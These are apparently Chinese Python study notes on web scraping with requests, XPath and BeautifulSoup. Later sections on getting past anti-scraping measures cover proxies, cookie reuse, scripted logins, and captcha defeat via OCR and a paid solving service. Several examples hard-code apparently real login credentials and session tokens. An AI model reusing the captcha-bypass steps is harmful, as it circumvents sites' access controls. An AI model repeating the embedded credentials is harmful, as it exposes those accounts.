# 看一下请求的url
print('response.url', response.url)
# 获取编码
print(response.encoding)
# 设定编码
# response.encoding = 'GBK'
# response.encoding = 'UTF-8'
# response.encoding = response.apparent_encoding

# 看一下返回的数据  以字符串形式返回的（一般情况下会乱码 需要给定编码）
print(response.text)

# 获取bytes
print( response.content)
print(response.content.decode()) # 使用默认解码方式
print(response.content.decode('UTF-8')) # 使用默认解码方式
print(response.content.decode('GBK')) # 使用默认解码方式

# 获取响应头
print(response.headers)

# 获取响应对应的请求头
print(response.request.headers)

print(response.ok)

# 获取JSON数据
print(response.json())
```

### 1-2， response.text 和response.content的区别

```python
## response.text

# 类型：str
# 解码类型： requests模块自动根据HTTP 头部对响应的编码作出有根据的推测，推测的文本编码
# 如何修改编码方式：`response.encoding="gbk/UTF-8"`
```

```python
## response.content

## 类型：bytes
## 解码类型： 没有指定
## 如何修改编码方式：`response.content.deocde("utf8")`
```

获取网页源码的通用方式：

```python
response.content.decode()
response.content.decode("UTF-8")
response.text

## 以上三种方法从前往后尝试，能够100%的解决所有网页解码的问题
## 所以：更推荐使用`response.content.deocde()`的方式获取响应的html页面
```

### 1-3，下载图片实例

```Python
import requests

# 图片的URL
url = 'https://ww4.sinaimg.cn/mw690/0076vsZ6ly1hiw5krf9wdj31401hcb2a.jpg'
# 发起请求
response = requests.get(url)
# 图片使用wb
with open('dlrb.jpg', 'wb') as f:
    f.write(response.content)
```

### 1-4，添加请求头

```python
import requests

url = 'http://www.baidu.com'

## 添加请求头
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36'
}
# 携带请求头
response = requests.get(url, headers=headers)
# print(response.content.decode())
print(response.request.headers)
```

### 1-5，get传参数

#### 1-5-1 第一种方式

```Python
import requests

## url  
## get参数在URL里以查询字符串形式传递
url = 'http://www.zishazx.com/product?page=1&size_id=0&volum_id=0&price_id=2&category_id=1001&prize_id=0&pug_id=25#views'

# 设置请求头
headers = {
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36'
}

# 发起get请求
response = requests.get(url, headers=headers)

# 获取返回数据
data = response.content.decode()
print(data)
# 写入
with open('zsh.html', 'w', encoding='UTF-8') as f:
    f.write(data)
```

#### 1-5-2 第二种方式

```Python
import requests

url = 'http://www.zishazx.com/product'
# 设置请求头
headers = {
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36'
}
# 鞋带的参数 get传参
params = {
    'page': 1,
    'size_id': 0,
    'volum_id': 0,
    'price_id': 2,
    'category_id': 1001,
    'prize_id': 0,
    'pug_id': 25
}

# 发起get请求  携带了 get传参 携带了headers请求头
response = requests.get(url, headers=headers, params=params)
# 获取返回数据
data = response.content.decode()
print(response.url)
# print(data)
# 写入
with open('zsh.html', 'w', encoding='UTF-8') as f:
    f.write(data)
```

### 1-6 实战案例

#### 1-6-1 获取图片案例

```python
import requests
from lxml import etree

url = 'https://app.mi.com/subject/115150'
headers = {
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36'
}

response = requests.get(url, headers=headers)
data = response.content.decode()

tree = etree.HTML(data)
li_list = tree.xpath('//ul[@class="applist"]/li')
for li in li_list:
    # 获取图片地址
    img_src = li.xpath('./a/img/@data-src')[0]
    # 获取名称
    name = li.xpath('./h5/a/text()')[0]
    # 获取简介
    decr = li.xpath('./p/a/text()')[0]
    print(img_src, name, decr)
```

#### 1-6-2 xpath紫砂之星抓取单页数据

```python
import requests
from lxml import etree

# 要抓取的url
url = 'http://www.zishazx.com/product'
# 给请求头 ua
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36'
}
# 发起get请求
res = requests.get(url, headers=headers)
# 获取响应的页面内容
data = res.content.decode()
# 实例化匹配对象
tree = etree.HTML(data)
# print(data)
# 获取到了所有的li
li_list = tree.xpath('//ul[@class="list clearfix"]/li')
for li in li_list:
    # 获取到图片的src地址
    img = li.xpath('./p[@class="img"]/a/img/@src')[0]
    name = li.xpath('./p[@class="name"]/text()')[0]
    p_no = li.xpath('./p[@class="p_no"]/text()')[0]
    print(img, name, p_no)
```

#### 1-6-3 bs4紫砂之星抓取单页数据

```python
import requests
from bs4 import BeautifulSoup

# 要抓取的url
url = 'http://www.zishazx.com/product'
# 给请求头 ua
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36'
}
# 发起get请求
res = requests.get(url, headers=headers)
# 获取响应的页面内容
data = res.content.decode()
# 实例化匹配对象
soup = BeautifulSoup(data, 'lxml')
# print(data)
# 获取到了所有的li
# li_list = tree.xpath('//ul[@class="list clearfix"]/li')
li_list = soup.find('ul', class_="list clearfix").findAll('li')
for li in li_list:
    # 获取到图片的src地址
    # img = li.xpath('./p[@class="img"]/a/img/@src')[0]
    img = li.find('p', class_="img").a.img['src']
    # name = li.xpath('./p[@class="name"]/text()')[0]
    name = li.find('p', class_="name").string
    # p_no = li.xpath('./p[@class="p_no"]/text()')[0]
    p_no = li.find('p', class_="p_no").string
    print(img, name, p_no)
```

#### 1-6-4 xpath小说阅读网

```python
from lxml import etree
import requests

url = 'https://www.readnovel.com/category'
# 给定请求头
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36'
}
# 发起请求
res = requests.get(url, headers=headers)
data = res.content.decode()
# print(data)
# 实例化tree对象
tree = etree.HTML(data)
# 获取所有图书的li
li_list = tree.xpath('//div[@class="right-book-list"]/ul/li')
for li in li_list:
    # 获取封面
    img = li.xpath('./div[@class="book-img"]/a/img/@src')[0]
    # 获取标题
    title = li.xpath('./div[@class="book-info"]/h3/a/text()')[0]
    # 获取简介
    intro = li.xpath('.//p[@class="intro"]/text()')[0]
    print(img, title, intro)
```

#### 1-6-5 bs4小说阅读网

```python
from bs4 import BeautifulSoup
import requests

url = 'https://www.readnovel.com/category'
# 给定请求头
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36'
}
# 发起请求
res = requests.get(url, headers=headers)
data = res.content.decode()
# print(data)
# 实例化tree对象
soup = BeautifulSoup(data, 'lxml')
# 获取所有图书的li
# li_list = tree.xpath('//div[@class="right-book-list"]/ul/li')
li_list = soup.find('div', class_="right-book-list").ul.findAll('li')
for li in li_list:
    # 获取封面
    # img = li.xpath('./div[@class="book-img"]/a/img/@src')[0]
    img = li.find('div', class_="book-img").a.img['src']
    # 获取标题
    # title = li.xpath('./div[@class="book-info"]/h3/a/text()')[0]
    title = li.find('div', class_="book-info").h3.a.string
    # 获取简介
    # intro = li.xpath('.//p[@class="intro"]/text()')[0]
    intro = li.find('p', class_="intro").string
    print(img, title, intro)
```

#### 1-6-6 xpath抓取优美图库

```python
import os
import random
import time

from lxml import etree
import requests

url = 'http://www.umeituku.com/bizhitupian/'
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36'
}

res = requests.get(url, headers=headers)
data = res.content.decode()
tree = etree.HTML(data)
# 获取所有二级标签页的url地址
a_list = tree.xpath('//div[@class="TypeList"]/ul/li/a/@href')
# 创建图片目录 存储当前的图片
path= 'img'
if not os.path.exists(path):
    os.mkdir(path)
for url in a_list:
    # 开始访问二级标签页内容
    res = requests.get(url, headers=headers)
    data = res.content.decode()
    tree = etree.HTML(data)
    try:
        # 找二级标签页当前大图的src地址和图片名称
        src = tree.xpath('//p[@align="center"]/a/img/@src')[0]
        alt = tree.xpath('//p[@align="center"]/a/img/@alt')[0]
        print(src, alt, '图片下载中======')
        # 图片存入本地
        with open(os.path.join(path, alt+'.jpg'), 'wb') as f:
            f.write(requests.get(src, headers=headers).content)
        print(src, alt, '图片下载完成......')
        # 给个时间自省
    except Exception as e:
        print(f'在抓取网址：{url}的过程中出现了问题， 问题为：', e)
    time.sleep(random.randint(1, 4))
print('OVER  下载结束！')
```

#### 1-6-7 抓取冶金信息

```python
from lxml import etree
import requests

url = 'http://www.metalinfo.cn/mi.html'
headers = {
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36'
}
"""
pageSize: 20
current: 2
resourceType: r_news
facetFilter: {}
order: desc
sort: sort_time
"""
res = requests.get(url, headers=headers)
data = res.content.decode()
tree = etree.HTML(data)
li_list = tree.xpath('//ul[@id="searchLists"]/li')
print(li_list)
for li in li_list:
    list_title = ''.join(li.xpath('//div[@class="list-title "]//text()'))
    list_intro = li.xpath('//div[@class="list-intro"]/text()')[0]
    list_keys = ''.join(li.xpath('//div[@class="list-keys"]/text()'))
    print(list_title, list_intro, list_keys)

```

#### 1-6-8 异步请求

```python
from lxml import etree
import requests

url = 'http://www.metalinfo.cn/json/search/list'
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36'
}
# 传递post数据
data = {
    'pageSize': 200,
    'current': 1,
    'resourceType': 'r_news',
    'facetFilter': {},
    'order': 'desc',
    'sort': 'sort_time',
}
# 发起post请求
res = requests.post(url, headers=headers, data=data)
# 获取json数据
json_data = res.json()['result']['records']
i = 0
for j in json_data:
    # 获取标题
    title = j['title']
    # 获取简介
    r_abstract = j['r_abstract']
    print(title)
    print(r_abstract)
    i += 1
print(i)
```

#### 1-6-9 中信证券抓取单页

```Python
import requests
from lxml import etree

url = 'http://www.cs.ecitic.com/newsite/cpzx/jrcpxxgs/zgcp/index.html'
headers = {
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
}

res = requests.get(url, headers=headers)
html = res.content.decode()
tree = etree.HTML(html)
li_list = tree.xpath('//ul[@class="list-con"]/li')
# print(li_list)
for li in li_list:
    con = li.xpath('./span/text()')
    th1 = con[0]
    th2 = con[1]
    th3 = con[2]
    th4 = con[3]
    th5 = con[4]
    print(th1, th2, th3, th4, th5)
```

## 2，反扒措施

### 2-1 代理的使用

```Python
# 用到的库
import requests
# 写入获取到的ip地址到proxy

# 一个ip地址
proxy = {
    'http':'http://221.178.232.130:8080'
}

res = requests.get(url, proxies=proxy)
print(res.content.decode())

### ----------------------------------------------------------------------------

# 多个ip地址
proxy = [
  {'http':'http://221.178.232.130:8080'},
  {'http':'http://221.178.232.130:8080'}
]

import random
proxy = random.choice(proxy) # 随机获取ip


res = requests.get(url, proxies=proxy)
print(res.content.decode())
```

### 2-2  处理cookie

#### 2-2-1 带cookie的请求

```python
import requests

url = 'https://xueqiu.com/statuses/hot/listV2.json?since_id=-1&max_id=554225&size=15'
headers = {
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    'Referer': 'https://xueqiu.com/',
    ## 携带cookie信息
    'Cookie':'cookiesu=121697804017738; device_id=2cb32776fe1f32adba3aefc52173bcdc; xq_a_token=e2f0876e8fd368a0be2b6d38a49ed2dd5eec7557; xqat=e2f0876e8fd368a0be2b6d38a49ed2dd5eec7557; xq_r_token=2a5b753b2db675b4ac36c938d20120660651116d; xq_id_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1aWQiOi0xLCJpc3MiOiJ1YyIsImV4cCI6MTcwMDY5OTg3NSwiY3RtIjoxNjk4MjM4NzI4MTU4LCJjaWQiOiJkOWQwbjRBWnVwIn0.RtY0JREVs0R4s9sgP2RsybzTrLY7UD5dDElnpf16r7-F02lOLkU7mdgAm0HjvKvbcAYYeRyP6Ke6rdy3WfbFI-RlJwzxIo5wZ4ScGzy0Vj3VYKqsh7-Wx8MnzyRjVcJPtVUfBlN_Plj5nmxnQPykmZwKSRjKT02YBy2XH4OHNaN0sG1Rst37mAj2f42lTogbHdfZBsRUkweP-UezUkEyvSncUYIe9IAMZmHf7d5AQ94BK5h3nhSqy01KyyTf2aonnwWG7rNrOeuo7F28S50Wz-1JBKtbQYhRbOEZL2FVpizmpC_h98pYl3RtDBVvbiUEJPxx1-bRN6J78h3bduYu0w; u=121697804017738; Hm_lvt_1db88642e346389874251b5a1eded6e3=1697804019,1698238782;'
}

# 再发请求。拿数据
res = requests.get(url, headers=headers)
print(res.json())
```

#### 2-2-2, coocie的字典形式

```Python
import requests

# 携带cookie登录雪球网  抓取完善个人资料页面
headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36',
    'Referer': 'https://xueqiu.com/u/1990923459',
    'Host': 'xueqiu.com',
}
url = 'https://xueqiu.com/users/connectnew?redirect=/setting/user'

cookie_dict = {
    'u': '1990923459',
    'bid': '1f110dfd43538f4b8362dfcd21ffbb64_l27g4lfl',
    'xq_is_login': '1',
    'xq_r_token': '5dcbe83944f0b75325f91246061d4a2a01999367'
}
res = requests.get(url, headers=headers, cookies=cookie_dict)
with open('雪球网.html', 'w') as f:
    f.write(res.content.decode('UTF-8'))
    print(res.content.decode('UTF-8'))
```

#### 2-2-3 获取服务端返回的cookie

```Python
import requests

url = 'https://xueqiu.com/'
headers = {
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
}
res = requests.get(url, headers=headers)
# 获取cookie
cookies = res.cookies
print(cookies)
# 获取字典格式的cookie
print(dict(cookies))
```

#### 2-2-4 携带首页服务器响应的cookie

```Python
import requests
# 就是为了获取cookie
index_url = 'https://xueqiu.com/'
headers = {
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    'Referer': 'https://xueqiu.com/',
}
res = requests.get(index_url, headers=headers)
# 获取cookie
cookies = dict(res.cookies)

url = 'https://xueqiu.com/statuses/hot/listV2.json?since_id=-1&max_id=554225&size=15'
# 携带cookie进行请求
res = requests.get(url, headers=headers, cookies=cookies)
print(res.json())
```

#### 2-2-5， 使用session处理cookie

```Python
import requests
# 就是为了获取cookie
headers = {
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    'Referer': 'https://xueqiu.com/',
}
# 使用这个session对象进行维护
session = requests.Session()
# session = requests.session()
# 请求首页  获取返回的cookie
index_url = 'https://xueqiu.com/'
session.get(index_url, headers=headers)

# 获取数据
url = 'https://xueqiu.com/statuses/hot/listV2.json?since_id=-1&max_id=554225&size=15'
# 携带cookie进行请求
res = session.get(url, headers=headers)
print(res.json())
```

#### 2-2-6 模拟登录

##### 6-1 手动处理cookie

```python
import requests

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
}
# 登录的url地址
login_url = 'https://passport.17k.com/ck/user/login'
data = {
    'loginName': '17346570232',
    'password': 'xlg17346570232',
}
# 发起登录请求
res = requests.post(login_url, headers=headers, data=data)
cookies = dict(res.cookies)  # 获取登录后的cookie

# 获取登录后的数据
url = 'https://user.17k.com/ck/user/myInfo/96139098?bindInfo=1&appKey=2406394919'
res = requests.get(url, headers=headers, cookies=cookies)
print(res.content.decode())
```

##### 6-2 自动维护cookie

```python
import requests

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
}
# 登录的url地址
login_url = 'https://passport.17k.com/ck/user/login'
data = {
    'loginName': '17346570232',
    'password': 'xlg17346570232',
}
# 发起登录请求
session = requests.Session()
session.post(login_url, headers=headers, data=data)

# 获取登录后的数据
url = 'https://user.17k.com/ck/user/myInfo/96139098?bindInfo=1&appKey=2406394919'
res = session.get(url, headers=headers)
print(res.content.decode())
```

### 2-3 案例

#### 2-3-1 处理验证码

##### 1-1  下载验证码

```python
## 首先找到发放验证码的URL地址，获取验证码保存到本地

import requests
# 验证码地址
url = 'https://so.gushiwen.cn/RandCode.ashx'
res = requests.get(url)

with open('yzm.jpg', 'wb') as f:
    f.write(res.content)
```

##### 1-2 识别验证码

```python
## 用验证码识别模块识别验证码

# 终端用pip安装ddddoce包
pip install ddddocr

# ddddocr可能会出现的问题
# 1 在运行过程中 报错最底部出现dll的问题  安装一下c++环境
# 2 运行顶部会出现PIL的问题
#         可能没安装pillow模块  pip install pillow
#         安装了(版本高了 卸载原有pillow 安装9.5.0的pillow模块)
#          pip uninstall  pillow
#          pip install   pillow==9.5.0
import ddddocr
ocr = ddddocr.DdddOcr()
with open('yzm.jpg', 'rb') as f:
    data = f.read()
result = ocr.classification(data)
print(result)
```

##### 1-3 登录

```python
import requests

url = 'https://so.gushiwen.cn/user/login.aspx?from=http%3a%2f%2fso.gushiwen.cn%2fuser%2fcollect.aspx'
headers = {
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    'Referer': 'https://so.gushiwen.cn/user/login.aspx?from=http://so.gushiwen.cn/user/collect.aspx',
}
email = '793390457@qq.com',
pwd = 'xlg17346570232',
data = {
    '__VIEWSTATE': 'AaJHgmeyf8Le6GErv1HkNyY9sDsTvgOx5w95HI82SkYSEWCpd9gSo2mvsYno9ZIc1D/tjgrPiujAhdRcKtnUjN5RdyvONf3MAk83da/5zRoc2WtYcqhyh1iEk9hVU6e7jmM8I07Z3dNPLNcAouMrW4mUaGk=',
    '__VIEWSTATEGENERATOR': 'C93BE1AE',
    'from': 'http://so.gushiwen.cn/user/collect.aspx',
    'email': email,
    'pwd': pwd,
    'code': 'k04c', 
    'denglu': '登录',
}
res = requests.post(url, headers=headers, data=data)
# print(res.content.decode())
with open('gsw.html', 'w', encoding='UTF-8') as f:
    f.write(res.content.decode())
```

##### 1-4 上面三步整合

```python
import requests
import ddddocr

url = 'https://so.gushiwen.cn/user/login.aspx?from=http%3a%2f%2fso.gushiwen.cn%2fuser%2fcollect.aspx'
headers = {
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    'Referer': 'https://so.gushiwen.cn/user/login.aspx?from=http://so.gushiwen.cn/user/collect.aspx',
}

# 验证码处理
img_url = 'https://so.gushiwen.cn/RandCode.ashx'
res = requests.get(img_url)
img = res.content
with open('yzm.jpg', 'wb') as f:
    f.write(img)
ocr = ddddocr.DdddOcr()
result = ocr.classification(img)

email = '793390457@qq.com',
pwd = 'xlg17346570232',
print(result)
data = {
    '__VIEWSTATE': 'AaJHgmeyf8Le6GErv1HkNyY9sDsTvgOx5w95HI82SkYSEWCpd9gSo2mvsYno9ZIc1D/tjgrPiujAhdRcKtnUjN5RdyvONf3MAk83da/5zRoc2WtYcqhyh1iEk9hVU6e7jmM8I07Z3dNPLNcAouMrW4mUaGk=',
    '__VIEWSTATEGENERATOR': 'C93BE1AE',
    'from': 'http://so.gushiwen.cn/user/collect.aspx',
    'email': email,
    'pwd': pwd,
    'code': result,
    'denglu': '登录',
}
res = requests.post(url, headers=headers, data=data)
# print(res.content.decode())
with open('gsw.html', 'w', encoding='UTF-8') as f:
    f.write(res.content.decode())
```

但是还是提示验证码不对？？ 问题出现在哪里？？

##### 1-5 最终版本

需要添加cookie数据

```Python
import requests
import ddddocr
session = requests.Session()
url = 'https://so.gushiwen.cn/user/login.aspx?from=http%3a%2f%2fso.gushiwen.cn%2fuser%2fcollect.aspx'
headers = {
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    'Referer': 'https://so.gushiwen.cn/user/login.aspx?from=http://so.gushiwen.cn/user/collect.aspx',
}
# 验证码处理
img_url = 'https://so.gushiwen.cn/RandCode.ashx'
res = session.get(img_url)
img = res.content
with open('yzm.jpg', 'wb') as f:
    f.write(img)
ocr = ddddocr.DdddOcr()
result = ocr.classification(img)

email = '793390457@qq.com',
pwd = 'xlg17346570232',
print(result)
data = {
    '__VIEWSTATE': 'AaJHgmeyf8Le6GErv1HkNyY9sDsTvgOx5w95HI82SkYSEWCpd9gSo2mvsYno9ZIc1D/tjgrPiujAhdRcKtnUjN5RdyvONf3MAk83da/5zRoc2WtYcqhyh1iEk9hVU6e7jmM8I07Z3dNPLNcAouMrW4mUaGk=',
    '__VIEWSTATEGENERATOR': 'C93BE1AE',
    'from': 'http://so.gushiwen.cn/user/collect.aspx',
    'email': email,
    'pwd': pwd,
    'code': result,
    'denglu': '登录',
}
res = session.post(url, headers=headers, data=data)
# print(res.content.decode())
with open('gsw.html', 'w', encoding='UTF-8') as f:
    f.write(res.content.decode())
```

##### 1-6 打码平台使用

```python
import base64
import json
import requests
def base64_api(uname, pwd, img, typeid):
    with open(img, 'rb') as f:
        base64_data = base64.b64encode(f.read())
        b64 = base64_data.decode()
    data = {"username": uname, "password": pwd, "typeid": typeid, "image": b64}
    result = json.loads(requests.post("http://api.ttshitu.com/predict", json=data).text)
    if result['success']:
        return result["data"]["result"]
    else:
        #！！！！！！！注意：返回 人工不足等 错误情况 请加逻辑处理防止脚本卡死 继续重新 识别
        return result["message"]
    return ''


if __name__ == "__main__":
    img_path = "./code.png"
    result = base64_api(uname='xxxxx', pwd='xxxxx', img=img_path, typeid=3)
    print(result)
        
import base64
import json
import requests
# 一、图片文字类型(默认 3 数英混合)：
# 1 : 纯数字
# 1001：纯数字2
# 2 : 纯英文
# 1002：纯英文2
# 3 : 数英混合
# 1003：数英混合2
#  4 : 闪动GIF
# 7 : 无感学习(独家)
# 11 : 计算题
# 1005:  快速计算题
# 16 : 汉字
# 32 : 通用文字识别(证件、单据)
# 66:  问答题
# 49 :recaptcha图片识别
# 二、图片旋转角度类型：
# 29 :  旋转类型
#
# 三、图片坐标点选类型：
# 19 :  1个坐标
# 20 :  3个坐标
# 21 :  3 ~ 5个坐标
# 22 :  5 ~ 8个坐标
# 27 :  1 ~ 4个坐标
# 48 : 轨迹类型
#
# 四、缺口识别
# 18 : 缺口识别（需要2张图 一张目标图一张缺口图）
# 33 : 单缺口识别（返回X轴坐标 只需要1张图）
# 五、拼图识别
# 53：拼图识别
def base64_api(uname, pwd, img, typeid):
    with open(img, 'rb') as f:
        base64_data = base64.b64encode(f.read())
        b64 = base64_data.decode()
    data = {"username": uname, "password": pwd, "typeid": typeid, "image": b64}
    result = json.loads(requests.post("http://api.ttshitu.com/predict", json=data).text)
    if result['success']:
        return result["data"]["result"]
    else:
        #！！！！！！！注意：返回 人工不足等 错误情况 请加逻辑处理防止脚本卡死 继续重新 识别
        return result["message"]
    return ""


if __name__ == "__main__":
    img_path = "C:/Users/Administrator/Desktop/file.jpg"
    result = base64_api(uname='你的账号', pwd='你的密码', img=img_path, typeid=3)
    print(result)
```

## 3，抓取多页数据

### 3-1  xpath紫砂之星抓取多页数据

```python
import random
import time

import requests
from lxml import etree

for i in range(1, 11):
    url = f'http://www.zishazx.com/product?page={i}&volum_start=0&volum_end=0&volum_id=0&price_start=0&price_end=0&category_id=0&pug_id=0&size_id=0&price_id=0&prize_id=0&search=&sflag=#views'
    print(f'正在抓取第{i}页数据======》')
    # 给请求头 ua
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36'
    }
    # 发起get请求
    res = requests.get(url, headers=headers)
    # 获取响应的页面内容
    data = res.content.decode()
    # 实例化匹配对象
    tree = etree.HTML(data)
    # print(data)
    # 获取到了所有的li
    li_list = tree.xpath('//ul[@class="list clearfix"]/li')
    for li in li_list:
        # 获取到图片的src地址
        img = li.xpath('./p[@class="img"]/a/img/@src')[0]
        name = li.xpath('./p[@class="name"]/text()')[0]
        p_no = li.xpath('./p[@class="p_no"]/text()')[0]
        print(img, name, p_no)
    time.sleep(random.randint(1,4))


```

### 3-2 抓取多页数据案例

```Python
"""
http://www.cs.ecitic.com/newsite/cpzx/jrcpxxgs/zgcp/index.html   1
http://www.cs.ecitic.com/newsite/cpzx/jrcpxxgs/zgcp/index_1.html  2
http://www.cs.ecitic.com/newsite/cpzx/jrcpxxgs/zgcp/index_4.html   5
"""

import requests
import re
from lxml import etree

url = 'http://www.cs.ecitic.com/newsite/cpzx/jrcpxxgs/zgcp/index.html'
headers = {
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
}

res = requests.get(url, headers=headers)
html = res.content.decode()
# print(html)
page = re.search('var countPage = (?P<page>\d+)//共多少页', html).group('page')
for i in range(int(page)+1):
    url = f'http://www.cs.ecitic.com/newsite/cpzx/jrcpxxgs/zgcp/index_{i}.html'
    if not i:
        url = f'http://www.cs.ecitic.com/newsite/cpzx/jrcpxxgs/zgcp/index.html'
    print(url)
```

### 3-3 登录处理

```Python
import requests
index_url = 'https://v3pro.houjiemeishi.com/PC/index.html'
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
}
session = requests.Session()
session.get(index_url, headers=headers)

# 登录的url地址
login_url = 'https://v3pro.houjiemeishi.com//index.php?store_id=1&store_type=6'
# 登录携带的表单数据
data = {
    'module': 'app_pc',
    'action': 'login',
    'm': 'login',
    'phone': 'luckyboy',
    'password': 'bHVja3lib3k=',
    'imgCode': 'flms',
    'language': '',
}
headers['Referer'] = 'https://v3pro.houjiemeishi.com/PC/pages/login/login.html'
res = session.post(login_url, data=data, headers=headers)
data = res.json()
print('登录后返回的', data)
access_id = data['data']['access_id']
# 抓取个人资料
own = 'https://v3pro.houjiemeishi.com//index.php?store_id=1&store_type=6'
data = {
    'module': 'app_pc',
    'action': 'user',
    'm': 'personal_resources',
    'access_id': access_id,
    'language': '',
}
headers['Referer'] = 'https://v3pro.houjiemeishi.com/PC/index.html?module=my&action=my&m=my&a=myinfor'
res = session.post(login_url, data=data, headers=headers)
print('获取个人资料的', res.json()
```

## 4，requests处理证书错误

![12306ssl错误](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/12306ssl%E9%94%99%E8%AF%AF.png)

```Python
import requests

url = "https://www.12306.cn/mormhweb/"
response = requests.get(url)
```

## 5、超时参数的使用

```python
response = requests.get(url,timeout=3)
```

## 6，请求参数类型

```python
 1. Query String Parameters
 	# 最终是要被添加在url上面的.
	# 此时, 你可以有两个选择.
	1. 把参数直接怼在url上面
		url = https://movie.douban.com/j/chart/top_list?type=13&interval_id=100%3A90&action=&start=0&limit=20
		requests.get(url)
	2. 把参数弄出来. 弄成字典. 然后通过params传递给服务器
		url = "https://movie.douban.com/j/chart/top_list"
        params = {
        type: 13
        interval_id: 100:90
        action:
        start: 0
        limit: 20
        }
		requests.get(url, params=params)
	3. 还可以混合搭配.
        url = "https://movie.douban.com/j/chart/top_list?type=13"
        params = {
        interval_id: 100:90
        action:
        start: 0
        limit: 20
        }

		requests.get(url, params=params)

# 上述三种方案. 最终在服务器是一样的..原因是, 请求是要遵守http协议的
# 在http协议中. get请求的所有参数都要怼在url上面

	2. Form Data
        # 首先Form Data一定是post请求
	    # 它的参数. 需要处理成字典. 然后再requests模块里.
            url = "xxxxx"
            data = {
            数据
            }

		requests.post(url, data=data)

	3. Request Payload 表示的就是挂载.
		# 挂载的数据类型不一定是json. 最多的是json...
		# 在请求头里. 会有一个content-type属性. 来描述该挂载内容的格式
		# 我们处理的时候. 一般是按照浏览器上面的提示. 来组装参数以及请求头

            url = "xxxxx"
            data = {
            字典
            }
		解决方案:
            1. 直接用json参数传递
            requests.post(url, json=data)

            # 把你传递的字典. 处理成json然后发送给服务器
            # 隐藏的逻辑:
            # 自动在请求头里帮你添加content-type: json....
            # 上述逻辑是自动的

            2. 手动把字典处理成json. 然后再请求头里增加content-type
            把处理好的json用data传递出去
            s = json.dumps(data, separators=(',', ':')) # json字符串

            requests.post(url, data=s, headers={
            "Content-Type": "application/json"
            })

			# 上述逻辑是自己手动来...
            4. 三种参数可以混搭....
            # Query String 和 Form Data
            # Query String 和 Requests payload

            # 用上面的三种方案. 混合处理即可.

    4. 请求头.
        User-Agent: 表示的是你的网络设备...
        Referer: 防盗链.
        # a页面 发请求到b页面. 在b页面的请求头上面就会有referer, 是a页面的地址.
        Cookie:
        # 客户端和服务器的会话状态.
        # 应该如何处理cookie
        1. 服务器在返回的http数据包的时候. 在响应头上会有Set-Cookie
        # Set-Cookie: xxxxx=xxxxx
